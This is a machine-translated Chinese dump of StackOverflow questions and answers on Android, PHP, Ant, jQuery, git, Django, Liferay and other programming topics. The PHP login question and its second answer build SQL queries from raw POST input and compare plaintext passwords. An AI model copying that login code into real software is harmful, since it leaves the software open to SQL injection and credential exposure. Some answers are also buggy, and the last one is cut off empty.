# StackOverflow 问答 10597000-10597999

# java - 如何在列表视图中显示存储在我的 SD 卡特定位置的图像

> ID：10597000
> 
> 赞同：0
> 
> 时间：2012-05-15T08:37:31.120
> 
> 标签：java, android

我创建了一个应用程序，其中我使用 SPenSDK 使用 canvasView 创建图像。在画布视图中创建图像后，我将图像保存在 SD 卡`/mnt/sdcard/SmemoExample`位置。现在我想显示存储`/mnt/sdcard/SmemoExample`在我的 ListView 中的所有图像。

但我无法找到任何解决方案。

**List_view.xml 文件**

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:orientation="vertical"
android:layout_width="fill_parent"
android:layout_height="fill_parent">
<ListView
    android:id="@+id/list"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" 
    android:layout_weight="1"/>
<Button
    android:id="@+id/button1"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content" 
    android:text="Clear Cache"/>
</LinearLayout> 
```

**item.xml 文件**

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout
xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="wrap_content">
<ImageView
  android:id="@+id/image"
  android:layout_width="50dip"
  android:layout_height="50dip" android:src="@drawable/ic_launcher"   android:scaleType="centerCrop"/>
<TextView
  android:id="@+id/text"
  android:layout_width="fill_parent"
  android:layout_height="wrap_content"
  android:layout_weight="1" android:layout_gravity="left|center_vertical" android:textSize="20dip" android:layout_marginLeft="10dip"/>
</LinearLayout> 
```

**爪哇代码**

```
public class ListActivity extends Activity {
private String[] mFileStrings;

private File[] listFile;

ListView list;

ImageAdapter adapter;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

     File file = new File(CanvasActivity.DEFAULT_APP_IMAGEDATA_DIRECTORY);

     if (file.isDirectory()) {
         listFile = file.listFiles();
         mFileStrings = new String[listFile.length];

         for (int i = 0; i < listFile.length; i++) {
             mFileStrings[i] = listFile[i].getAbsolutePath();
         }
     }

     list = (ListView) findViewById(R.id.list);
     adapter = new ImageAdapter(this, mFileStrings);
     list.setAdapter(adapter);
}

public class ImageAdapter extends BaseAdapter {
    private Activity activity;
    private String[] data;
    private LayoutInflater inflater=null;
    public ImageLoader imageLoader; 

    public ImageAdapter(Activity a, String[] d) {
        activity = a;
        data=d;
        inflater = (LayoutInflater)activity.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        imageLoader=new ImageLoader(activity.getApplicationContext());
    }

    public int getCount() {
        return data.length;
    }

    public Object getItem(int position) {
        return position;
    }

    public long getItemId(int position) {
        return position;
    }

    public View getView(int position, View convertView, ViewGroup parent) {
        View vi=convertView;
        if(convertView==null)
            vi = inflater.inflate(R.layout.item, null);

        TextView text=(TextView)vi.findViewById(R.id.text);;
        ImageView image=(ImageView)vi.findViewById(R.id.image);
        text.setText("item "+position);
        imageLoader.DisplayImage(data[position], image);
        return vi;
    }
}
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T11:34:24.707

答案供上述问题和其他答案参考。

看看[LazyList](https://github.com/thest1/LazyList)项目。现在我们对其进行一些修改..

**MainActivity.java**

```
private String[] mFileStrings;
private File[] listFile;

    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        File file = new File("<Directory path from sdcard>");

        if (file.isDirectory())
        {
            listFile = file.listFiles();
            mFileStrings = new String[listFile.length];

            for (int i = 0; i < listFile.length; i++)
            {
                mFileStrings[i] = listFile[i].getAbsolutePath();
            }
        }

        list = (ListView) findViewById(R.id.list);
        adapter = new LazyAdapter(this, mFileStrings);
        list.setAdapter(adapter);

        Button b = (Button) findViewById(R.id.button1);
        b.setOnClickListener(listener);
    } 
```

在**ImageLoader.java中**

```
private Bitmap getBitmap(String url)
    {
        File f = new File(url);

        //from SD cache
        Bitmap b = decodeFile(f);
        if (b != null)
        {
            return b;
        }
        return null;
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T08:38:13.387

`m_Folder = new File("/sdcard/SmemoExample");`<--- 删除**mnt**

`m_Folder = new File(Environment.getExternalSorage()+"SmemoExample");`

```
Bitmap bitmap = BitmapFactory.decodeFile(imageInSD,bOptions); 
```

看[这个](http://android-example-code.blogspot.in/p/download-store-and-read-images-from.html)完整的例子如何下载和保存图像在 sdcard 和从 sdcard 显示...

希望这会奏效......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T08:57:34.907

由于您的问题是如何将图像获取到列表视图，我假设您可以从 sd 卡中获取文件。之后你可能想看看这个 github 项目。[懒惰列表](https://github.com/thest1/LazyList)。

另外，通过搜索，我只从这里获得了该链接。 [ListView 中图像的延迟加载](https://stackoverflow.com/questions/541966/android-how-do-i-do-a-lazy-load-of-images-in-listview)

# php - 在 php 中运行 _search 命令

> ID：10597001
> 
> 赞同：0
> 
> 时间：2012-05-15T08:37:35.073
> 
> 标签：php, elasticsearch

现在我面临另一个问题：当我跑步时

```
$ curl -X GET 'http://localhost:9200/sample/new/_search?pretty=true' -d '{ fields:"price_incl_tax","product_id"],query:{range:{price_incl_tax:{gte:1000,lte:1500}}} }' 
```

在 cygwin 中，它可以工作并给出正确的结果。但是当我 `"http://localhost:9200/sample/new/_search?pretty=true -d ' { fields:["price_incl_tax","product_id"],query:{range:{price_incl_tax:{gte:1000,lte:1500}}} }'"` 在浏览器中打开链接时，我得到了错误的答案。我得到`20(everything) results`而我应该得到`only 2`。该怎么办？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-16T05:10:09.367

我得到了答案....而不是第二个函数我应该使用这个： `function nice_format($type, $q){ return $this->call($type . '/_search?pretty=true', array('method' => 'GET', 'content' => $q));; }`

# ant - 如何在ant中通过引用传递参数

> ID：10597002
> 
> 赞同：0
> 
> 时间：2012-05-15T08:37:36.040
> 
> 标签：ant, ant-contrib

大家好，这是我的目标调用代码。

```
<target name="abc">
  <var name="x" value="10"/>
  <antcall target="def"/>
  <!--Again Access The value of x here and also change it here-->
</target>

<target name="def">
  <!--Access The value of x here and also change it here-->
</target> 
```

而且我想在其他构建文件中访问这个X，有什么办法吗

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:15:57.827

这对蚂蚁来说是不可能的。属性是不可变的，不能重置。[ant contrib](http://ant-contrib.sourceforge.net/tasks/tasks/variable_task.html)的var 任务可用于覆盖值，但应谨慎使用。

您可以使用临时文件来实现您想要的。但可能你正在尝试一些奇怪的东西，可以用不同的方式解决。
如果它们有权访问属性文件，这也适用于构建文件。

```
<target name="abc">
  <var name="x" value="10"/>
  <antcall target="def"/>
  <!--Again Access The value of x here and also change it here-->
  <var unset="true" file="myproperty.properties" /> <!-- read variable from property file-->
</target>

<target name="def">
  <echo file="myproperty.properties" append="false">x=12</echo> <!-- create a new propertyfile-->
</target> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T10:02:21.793

为了公正起见，有一个 hack 允许在没有任何额外库的情况下更改 ant 的不可变属性（从 java 6 开始）：

```
<scriptdef name="propertyreset" language="javascript"
    description="Allows to assing @{property} new value">
    <attribute name="name"/>
    <attribute name="value"/>
        project.setProperty(attributes.get("name"), attributes.get("value"));
</scriptdef> 
```

用法：

```
<target name="abc">
    <property name="x" value="10"/>
    <antcall target="def"/>
</target>

<target name="def">
    <propertyreset name="x" value="11"/>
</target> 
```

正如@oers 所提到的，在所有规范方法被证明不适合之后，应谨慎使用。

如果不知道问题背后的目标，很难进一步提出建议。

# php - db_field() 在 php

> ID：10597004
> 
> 赞同：0
> 
> 时间：2012-05-15T08:37:39.957
> 
> 标签：php, mysql

我的 db_field 有什么问题。在第 15 行：

```
$sql = "SELECT * FROM Persons WHERE $loFmUname = '".strtolower($db_field['UserName'])."' AND $myPwd = '".$db_field['UserPwd']."'"; 
```

我的代码是

```
<?php
session_start();
$con = mysql_connect("localhost","root","");
if (!$con){
   die('Could not connect: ' . mysql_error());
}

$db_exist = mysql_select_db("seta", $con);

$myUName = $_POST["username"];
$myPwd = $_POST["pwd"];
$loFmUname = strtolower($myUName);

if($db_exist){
    $sql = "SELECT * FROM Persons WHERE $loFmUname = '".strtolower($db_field['UserName'])."' AND $myPwd = '".$db_field['UserPwd']."'";
    $result = mysql_query($sql);
    if($result){
        $_SESSION['loged'] = '$loFmUname';
        header('Location: index.html');
        die();
    } else {
        echo "Invalid username and/or password please";
        echo "<a href='login.php'>try again</a>";
    }
} else {
    echo "Sorry Database Not Found";
}

mysql_close($con);
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T08:41:11.180

简单：变量`db_field`不会在任何地方用任何值初始化。你不是在使用它之前创建它。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-15T08:41:54.037

尝试这个

```
$sql = "SELECT * FROM Persons WHERE ". $loFmUname." = '".strtolower($db_field['UserName'])."' AND ".$myPwd." = '".$db_field['UserPwd']."'"; 
```

# c# - URL 的 C# 正则表达式

> ID：10597005
> 
> 赞同：0
> 
> 时间：2012-05-15T08:37:44.637
> 
> 标签：c#, html, regex

试图获得一个匹配 url 的正则表达式，例如“http://www.test.com”，然后在它周围放置锚标签 - 该部分已经在使用以下内容：

```
regex = @"(?:(?:https?|ftp|file):\/\/|www\.|ftp\.)(?:\([-A-Z0-9+&@#\/%=~_|$?!:;,.]*\)|[-A-Z0-9+&@#\/%=~_|$?!:;,.])*(?:\([-A-Z0-9+&@#\/%=~_|$?!:;,.]*\)|[A-Z0-9+&@#\/%=~_|$])"
msg = r.Replace( msg, "<a target=\"_blank\" href=\"$0\">$0</a>" ); 
```

但是当输入文本中有图像标签时，它会错误地将锚标签放在图像标签的 src 属性中，例如

```
<img src="<a>...</a>" />; 
```

到目前为止，我正在尝试绕过它：（不工作）

```
regex = @"(?!(src=""))(?:(?:https?|ftp|file):\/\/|www\.|ftp\.)(?:\([-A-Z0-9+&@#\/%=~_|$?!:;,.]*\)|[-A-Z0-9+&@#\/%=~_|$?!:;,.])*(?:\([-A-Z0-9+&@#\/%=~_|$?!:;,.]*\)|[A-Z0-9+&@#\/%=~_|$])" 
```

编辑：

（示例测试输入）：

```
<p>
    www.test1.com<br />
    <br />
    http://www.test2.com<br />
    <br />
    https://www.test3.com<br />
    <br />
    &quot;https://www.test4.com<br />
    <br />
    &#39;https://www.test4.com<br />
    <br />
    =&quot;https://www.test4.com</p>
<p>
    &nbsp;</p>
<p>
    <img alt="" src="..." style="width: 500px; height: 375px;" /></p> 
```

（示例输出）：

```
<p>
    <a target="_blank" href="www.test1.com">www.test1.com</a><br />
    <br />
    <a target="_blank" href="http://www.test2.com">http://www.test2.com</a><br />
    <br />
    <a target="_blank" href="https://www.test3.com">https://www.test3.com</a><br />
    <br />
    &quot;<a target="_blank" href="https://www.test4.com">https://www.test4.com</a><br />
    <br />
    &#39;<a target="_blank" href="https://www.test4.com">https://www.test4.com</a><br />
    <br />
    =&quot;<a target="_blank" href="https://www.test4.com">https://www.test4.com</a></p>
<p>
    &nbsp;</p>
<p>
    <img alt="" src="<a target="_blank" href="...">...</a>" style="width: 500px; height: 375px;" /></p> 
```

（所需的输出）：

```
<p>
    <a target="_blank" href="www.test1.com">www.test1.com</a><br />
    <br />
    <a target="_blank" href="http://www.test2.com">http://www.test2.com</a><br />
    <br />
    <a target="_blank" href="https://www.test3.com">https://www.test3.com</a><br />
    <br />
    &quot;<a target="_blank" href="https://www.test4.com">https://www.test4.com</a><br />
    <br />
    &#39;<a target="_blank" href="https://www.test4.com">https://www.test4.com</a><br />
    <br />
    =&quot;<a target="_blank" href="https://www.test4.com">https://www.test4.com</a></p>
<p>
    &nbsp;</p>
<p>
    <img alt="" src="..." style="width: 500px; height: 375px;" /></p> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:21:52.243

在我看来，使用正则表达式处理 HTML 是一种错误的方法。

把它放在一边 - 只需在您的正则表达式匹配成功后添加该规则：

if(regexResult.Count(c => c == '/') > 2) regexResult 有两个以上的 '/' 字符，这是一个无效的结果；

如果它解决了您的问题，您可以将此规则添加到您的正则表达式模式中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-17T05:46:27.727

这是为我解决问题的正则表达式：

```
String regex = @"(?<!(""|'))((http|https|ftp|file):\/\/|www\.|ftp\.)(?:\([-A-Z0-9+&@#\/%=~_|$?!:;,.]*\)|[-A-Z0-9+&@#\/%=~_|$?!:;,.])*(?:\([-A-Z0-9+&@#\/%=~_|$?!:;,.]*\)|[A-Z0-9+&@#\/%=~_|$])"; 
```

我使用了回溯否定断言来确保 url 之前没有开引号

# javascript - $(window).hashchange() 不起作用

> ID：10597007
> 
> 赞同：8
> 
> 时间：2012-05-15T08:38:00.370
> 
> 标签：javascript, jquery, ajax

**嗨**，

我正在尝试使用浏览器后退按钮，我了解如何使用 hashchange 插件捕捉事件 =>

```
$(window).hashchange( function(){
    alert( location.hash );
});$(window).hashchange(); 
```

当我尝试加载新页面时，什么也没有发生。有没有办法用新的网址“重新加载”页面？

谢谢 ！

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-05-15T08:39:28.317

试试这个：

```
$(window).on('hashchange', function(){
    // Your code goes here
}).trigger('hashchange'); // bind event to the same selector as event-listener 
```

[`.trigger()`](http://api.jquery.com/trigger/)基本上手动激活事件。

**编辑：**
这应该足够你工作了。

试试[这段代码](http://jsfiddle.net/HNMfU/2/)，看看你有没有运气。

包含的 javascript.js 是用 jquery 和 hashchange 压缩的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-08-21T14:50:11.073

放在`$(window).bind('hashchange', function() {});`文档之外。准备好

# asp.net-mvc - ASP.NET MVC 项目的日志记录工具？

> ID：10597008
> 
> 赞同：2
> 
> 时间：2012-05-15T08:38:06.603
> 
> 标签：asp.net-mvc, asp.net-mvc-3, logging

我正在寻找可以记录事物的日志服务，例如，如果 AD 用户通过更改 DDL 中的值来更改实体对象上的值，然后在视图中提交表单，它应该在某处记录。

喜欢：

> “Robert Johnson 将 column_Race 上的值更改为该 column_name 上的“cat”。”

任何类型的提示表示赞赏！

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T08:41:06.660

您可以使用 .NET 框架的[内置跟踪功能](http://msdn.microsoft.com/en-us/library/system.diagnostics.trace.aspx)。另一种可能性是使用第三方日志框架，例如[log4net](https://logging.apache.org/log4net/)，它是 .NET 常用的日志框架。

# html - 为什么此布局仅在 IE 中具有滚动条？

> ID：10597011
> 
> 赞同：0
> 
> 时间：2012-05-15T08:38:10.507
> 
> 标签：html, internet-explorer, css

我有一个在 Chrome 中运行良好的布局，但主要内容区域在应该为 100% 时提供滚动条。这可以在 IE 中更正吗？

此布局中主要内容区域为黑色：http: [//jsfiddle.net/mp8nr/34/](http://jsfiddle.net/mp8nr/34/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T12:39:21.007

`#wrap {height:300px;}`在像素中使用或`#wrap {height:50%;}`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T19:25:46.157

听起来你不应该只关闭滚动条 -

poss 检查 CSS 中边距的使用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T08:48:17.127

您可以隐藏滚动条或使它们自动显示/隐藏：

**CSS**：

```
html, body {
  overflow: auto;
} 
```

这将解决你的问题。

# ajax - TypeError（无法将 nil 转换为字符串）：错误

> ID：10597014
> 
> 赞同：1
> 
> 时间：2012-05-15T08:38:13.620
> 
> 标签：ajax, ruby-on-rails-3, controller

我正在尝试通过 Rails 控制器将 JSON 数据发布到服务器。我的ajax就像

```
$.ajax( {
    url: "http://localhost:3000/widget_denemes/getUserInfo",
    data: {userInfo: {mainURL:document.location.href}},
    dataType: 'json',
    type: 'POST',
    success: function(data) {
        alert("Successful");
    },
    error: function() {
        alert("Unsuccessful");
    }
}); 
```

我的控制器就像

```
 def getUserInfo
    data = ActiveSupport::JSON::decode(params[:userInfo])
    format.json {head :ok}
  end 
```

我的路线也是

```
post 'widget_denemes/getUserInfo' => 'widget_denemes#getUserInfo' 
```

但是当我运行服务器时，我在终端上看到了这个问题

```
Started POST "/widget_denemes/getUserInfo" for 127.0.0.1 at 2012-05-15 11:34:20 +0300
Processing by WidgetDenemesController#getUserInfo as HTML
  Parameters: {"userInfo"=>{"mainURL"=>"file://localhost/Users/ender/Desktop/widgetTest.html"}}
Completed 500 Internal Server Error in 0ms

TypeError (can't convert ActiveSupport::HashWithIndifferentAccess into String):
  app/controllers/widget_denemes_controller.rb:36:in `getUserInfo' 
```

有什么问题？我应该如何解决它？

# javascript - 用于检查多个值的 jQuery 'if' 条件

> ID：10597015
> 
> 赞同：7
> 
> 时间：2012-05-15T08:38:16.570
> 
> 标签：javascript, jquery

在下面的代码中，有没有更好的方法来使用 jQuery 检查条件？

```
if(($('#test1').val() == 'first_value')||($('#test2').val() == 'second_value') && ($('#test3').val()!='third_value')|| ($('#test4').val()!='fourth_value')) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T08:41:59.610

除非有其他问题，例如如果您将重用 #test1, ... 字段进行更多处理，您的应该是好的。

如果您要再次获取任何值来做某事，我建议您将 $('#test1') 结果存储在一个变量中，这样您就不需要重新查询 dom。

前任：

```
var t1 = $('#test1');
if((t1.val() == 'first_value')||($('#test2').val() == 'second_value') && ($('#test3').val()!='third_value')|| ($('#test4').val()!='fourth_value')) {
    t1.val('Set new value');
} 
```

这也提高了行的可读性；）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T08:45:39.663

```
var c=0, b='#test', a=['first_value','second_value','third_value','fourth_value'];
for(var i=0; i<4; i++)
    if($(b+i).val() == a[i])
        c=1;
if (c) //Do stuff here 
```

这会将您的代码大小减少 25 个字节；-)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T08:56:45.843

**演示**：另一个想法是在[http://jsfiddle.net/h3qJB/](http://jsfiddle.net/h3qJB/)。请让我知道情况如何。

你也可以像这样进行链接：

```
$('#test1, #test2, #test3, #test4').each(function(){ //...use this.value here  }); 
```

可能是*[德摩根定律](http://en.wikipedia.org/wiki/De_Morgan%27s_laws)*让您了解如何使逻辑更紧凑（尽管我不确定具体情况是什么，**或者**它是否像比较值一样简单）。

### 代码

```
var boolean1 = (($('#test1').val() == 'first_value')||($('#test2').val() == 'second_value'))

var boolean2 = (($('#test3').val()!='third_value')|| ($('#test4').val()!='fourth_value'))

if (boolean1 && boolean2)
    alert("bingo");
else
    alert("buzzinga"); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-15T08:53:16.080

```
var values = ['first_value', 'second_value', 'third_value', 'fourth_value'];
$('#test1, #test2, #test3, #test4').each(function(index, el) {
   if($.inArray(this.value, values)) {
     // do some job;
     return false; // or break;
   }
}); 
```

# git - git pager=cat 最后缺少换行符

> ID：10597016
> 
> 赞同：2
> 
> 时间：2012-05-15T08:38:19.477
> 
> 标签：git

我已经设置`core.pager=cat`了，但是它不会在输出的末尾插入换行符，因此新提示出现在与 git 输出的最后一行相同的行上。

我该如何解决？

例子：

```
Lohoris@Pelociccio /cygdrive/d/work/MixArt$ git lo
* d42d527 2012-05-14 18:58:38 +0200 | Hidden: diff_find e diff_shown (XDK: v0.0.8) (HEAD, origin/master, master) [Lorenzo Petrone]
* 3829928 2012-05-14 18:28:38 +0200 | Hidden.diff_all (XDK: v0.0.7) [Lorenzo Petrone]
[...]
* 9a033bb 2012-05-14 10:35:29 +0200 | fix Hidden [Lorenzo Petrone]
* eb2d57d 2012-05-11 18:23:02 +0200 | crash() [Lorenzo Petrone]Lohoris@Pelociccio /cygdrive/d/work/MixArt$ 
```

请注意新提示如何位于最后一个 git 输出行的同一行。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T08:53:34.067

您的问题`--pretty:format`与寻呼机无关。您可能希望使用`tformat`而不是`format`提供您正在寻找的终止符语义。

尝试：

```
git log --pretty=tformat:"%h %ai | %s%d [%an]" --graph --date=short -n 12 
```

# python - python 谷歌应用引擎编程

> ID：10597019
> 
> 赞同：1
> 
> 时间：2012-05-15T08:38:32.437
> 
> 标签：python, google-app-engine

我的models.py中有2个模型>书架和书。模型 Book 有一个字段 ReferenceProperty(Shelf)，它还有一个 IntegerProperty 字段来存储编号。书中的页数。我想要实现的是根据最高页数（应该是该书架中所有书籍的页数之和）按降序获取前 25 个书架名称的列表。

我是python编程的初学者。请给我提意见。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T14:41:03.317

在 App Engine 上，我认为最好的方法是将总页数存储在书架内。在架子上添加一个 IntegerProperty 字段，我将其称为 totalPages。每次您在书架上添加或删除一本书时，都要适当地更新 totalPages。请注意，这需要在事务中完成。

然后很容易通过totalPages 搜索Shelf 对象。

# django - FormWizard 和 FileFields (Django 1.4)

> ID：10597021
> 
> 赞同：5
> 
> 时间：2012-05-15T08:38:33.543
> 
> 标签：django, django-formwizard

我的 FormWizard (Django 1.4) 允许用户来回走动，直到完成向导。向导保留用户填写的所有值并显示它们，以防用户返回到他已经完成的步骤。

这适用于 CharField，但不适用于 FileFields。如果用户在一个包含 FileField 的步骤中提交了一个文件，然后又回到这个步骤，他必须再次上传一个文件。

有没有办法让用户不必重新上传文件？

请注意，表单数据尚未保存到数据库中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-01T07:27:01.777

我最近遇到了同样的问题，可以通过继承 Django 的 SessionWizardView（在我的例子中为 NamedUrlSessionWizardView）并覆盖 get_form 方法来解决它。

**基本上我会执行以下操作：**

*   获取已为该步骤存储的文件。
*   遍历当前提交的文件。
*   如果提交的文件为无，则忽略它，否则覆盖已存储的值。

**这是代码：**

```
from django.contrib.formtools.wizard.views import NamedUrlSessionWizardView

class MyWizardView(NamedUrlSessionWizardView):

    def get_form(self, step=None, data=None, files=None):
        if step:
            step_files = self.storage.get_step_files(step)
        else:
            step_files = self.storage.current_step_files

        if step_files and files:
            for key, value in step_files.items():
                if files.has_key(key) and files[key] is not None:
                    step_files[key] = files[key]
        elif files:
            step_files = files

        return super(MyWizardView, self).get_form(step, data, step_files) 
```

# iphone - 如何在 iPhone 的 SQLite 3 中添加超过 20 列

> ID：10597023
> 
> 赞同：1
> 
> 时间：2012-05-15T08:38:39.550
> 
> 标签：iphone, objective-c, macos, sqlite

我是一名 iPhone 开发人员。我在 iPhone 上使用 SQLite Manager (SQLite 3)，并在 Mac 上的 Firefox 中添加了 SQLite Manager 插件。

现在我需要创建一个包含 30 列的表。但是，SQLite 管理器最多支持每个表 20 列。添加 20 列后，没有添加更多的选项。

如何在 SQLite 中创建超过 20 列的表？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T08:47:20.273

有多种方法可以做到这一点。

> <> 你可以编写 SQL 查询来创建数据库。
> 
> <> 您可以使用其他 SQLite 工具来创建数据库： : 使用[MesaSQLite](http://www.google.co.in/url?sa=t&rct=j&q=mesasqlite&source=web&cd=1&ved=0CGkQFjAA&url=http://download.cnet.com/MesaSQLite/3000-2065_4-166835.html&ei=cReyT9SCL8rjrAfrid2WBA&usg=AFQjCNGwOQfXXr8MXyaEClqzot_JJyTz8g&cad=rja)：它是一个具有更多功能的 GUI 工具。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T08:55:34.613

使用 sqlite manager 你也可以做到这一点。最初创建有 20 列的表。之后从左侧面板中选择表格。在右侧，您将看到添加列的选项，您可以在其中指定名称、类型、非空、列的默认属性。

其他答案也很有用，但如果您只愿意使用 sqlite 管理器，您可能会发现这也很有用。

希望这可以帮助。

# login - 如何在 liferay 中重新获得登录 Portlet

> ID：10597031
> 
> 赞同：5
> 
> 时间：2012-05-15T08:39:02.837
> 
> 标签：login, liferay, portlet, invisible

我是 Liferay 5.1 技术的新手。

我错误地删除了登录 portlet，现在我无法登录到应用程序。

我的意思是登录 portlet 不再可见，任何帮助都会有很大帮助。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-15T11:53:37.537

您可以尝试点击以下网址吗？

> 本地主机：8080/c/portal/login

用您的主机和端口号替换主机和端口。

如果它不起作用，请尝试执行以下操作。（确保包正确，因为我不知道 5.1 中的包路径）

[http://www.liferay.com/community/forums/-/message_boards/message/5005621](http://www.liferay.com/community/forums/-/message_boards/message/5005621)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-30T23:41:28.680

实际上，只要有足够的持久性，也可以将自己锁定为无法访问`/c/portal/login`（从 Liferay 6.0.6 开始）。这可以通过将社区主页设置为隐藏的“重定向”页面（与默认的“portlet”页面相反）来完成，从而使 /c/portal/login 重定向到主页重定向的任何位置。

Liferay 试图通过在您尝试隐藏主页时发出警报来防止这样做。但是您可以隐藏某些页面，然后将其拖放到站点地图根级别的第一个位置。

这样做的原因是为了实现门户导航的某种外观（否则需要对主题进行一些修改），即使主页重定向到它的其中一个孩子。

回到主题，当`/c/portal/login`失败时，还有另一种更可靠（但更丑陋）的方法可以访问所谓的登录页面 - 将此：附加`?p_p_id=58&p_p_state=maximized`到任何非重定向 Liferay 页面（并可能删除任何其他 GET参数（如果存在）。这也基本上是什么`/c/portal/login`- 但它将它附加到主页，所以如果主页是一个重定向页面，它将无法在其最大化状态下显示登录 portlet。

# javascript - 没有水平滚动条的jquery图像动画

> ID：10597043
> 
> 赞同：1
> 
> 时间：2012-05-15T08:39:38.287
> 
> 标签：javascript, jquery, css

在调整窗口大小时，我已经成功地使用可见的水平滚动条完成了相同的任务（如[单击此处 #1](http://jsfiddle.net/XnPjL/2/)所示），但现在我想避免这种不受欢迎的行为。我想在css和js文件中用“background-position：”替换“left”属性，但是动画根本不起作用....有人知道吗？这是我的最后一个版本：[点击这里#2](http://jsfiddle.net/linuxatico/XnPjL/3)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T08:43:16.183

您需要将动画元素放在具有 CSS 属性的 div 容器中`overflow:hidden`

# symfony - Sonata Admin Bundle configureShowFields 上的原始过滤器

> ID：10597046
> 
> 赞同：1
> 
> 时间：2012-05-15T08:39:53.497
> 
> 标签：symfony, twig, symfony-sonata, admin-generator

我正在使用 Symfony2 和 Sonata Admin Bundle 做一个项目。如何在操作 configureShowFields 中应用 twig 的过滤器 raw（以显示格式化文本）？

我不会覆盖奏鸣曲模板...

我的 configureShowFields 代码：

```
protected function configureShowFields(ShowMapper $showMapper)
    {
        $showMapper
            ->add('active')
            ->add('title')
            ->add('subtitle') // I need this field with twig RAW filter
            ->add('description') //I need this field with twig RAW filter
            ->add('url')
            ->add('date')
            ->add('tags')
            ->add('file');
    } 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-10-25T07:19:46.040

您可以使用“安全”奏鸣曲字段选项，如下所示：

```
protected function configureShowFields(ShowMapper $showMapper)
{
    $showMapper
        ->add('subtitle', null, array('safe' => true))
    ;
} 
```

它会将“原始”树枝过滤器添加到您的实体字段。

从 base_show_field.html.twig：

```
{% block field %}
    {% if field_description.options.safe %}
       {{ value|raw }}
    {% else %}
       {{ value|nl2br }}
    {% endif %}
{% endblock %} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T14:21:24.370

您需要制作自定义模板。

在下面：

```
sonata_doctrine_orm_admin:
  templates:
    types:
      list:
        array:      SonataAdminBundle:CRUD:list_array.html.twig
        *** other existing declarations ***
        raw:        MyBundle:CRUD:raw.html.twig 
```

然后制作声明映射到的模板，并将“raw”作为添加字段的第二个参数。然后它将调用您的新模板来呈现该字段。

# excel - 我可以调整 Excel 列的宽度而不单独设置它们吗？

> ID：10597047
> 
> 赞同：5
> 
> 时间：2012-05-15T08:39:58.910
> 
> 标签：excel, coldfusion, formatting, cfspreadsheet

我正在`cfspreadsheet`使用 ColdFusion 生成 Excel 电子表格。我插入一个标题行，然后用于`spreadsheetAddRows`将查询转储到工作表中。问题是列通常不够宽。我知道我可以`SpreadsheetSetColumnWidth`单独调整每一列，但是有什么方法可以将自动宽度应用于整个工作表？我不知道每列的最大宽度，我不想将它单独应用于每一列。Excel 具有列的自动宽度功能——有什么方法可以从 ColdFusion 代码中触发它？（或者甚至更好：我可以添加到自动宽度 - 将每列设置为最大宽度 + 2 或其他东西吗？）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T17:27:30.177

最后我检查了没有记录的 CF 函数。但是，您可以使用 POI 的[autoSizeColumn(columnIndex)](http://poi.apache.org/apidocs/org/apache/poi/hssf/usermodel/HSSFSheet.html#autoSizeColumn%28int%29)方法来自动调整每列的大小。请注意 POI 对工作表和列索引使用基数为零。

```
<cfscript>
    // create a workbook and add a long value
    wb = SpreadSheetNew();
    spreadSheetSetCellValue(wb, repeatString("x", 200), 1, 1);
    // get the first sheet
    sheet = wb.getWorkBook().getSheetAt( javacast("int", 0) );
    // resize first column ie "A"
    sheet.autoSizeColumn( javacast("int", 0) );
    spreadSheetWrite( wb, "c:/test.xls", true ); 
</cfscript> 
```

# asp.net-mvc-3 - 我应该在实体框架连接字符串中使用 Pooling=False 吗？

> ID：10597051
> 
> 赞同：2
> 
> 时间：2012-05-15T08:40:14.547
> 
> 标签：asp.net-mvc-3, entity-framework, entity-framework-4, azure, connection-pooling

我们有一个在 Azure 上运行的 ASP.Net MVC3 应用程序，通过实体框架连接到 Sql Azure 数据库。

产生这个的开发者在连接字符串中有 Pooling=False 。我会认为这是一个坏主意——如果可能的话，我们不想重用连接吗？

谁能给我一些指导什么时候这可能是个好主意？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:05:14.013

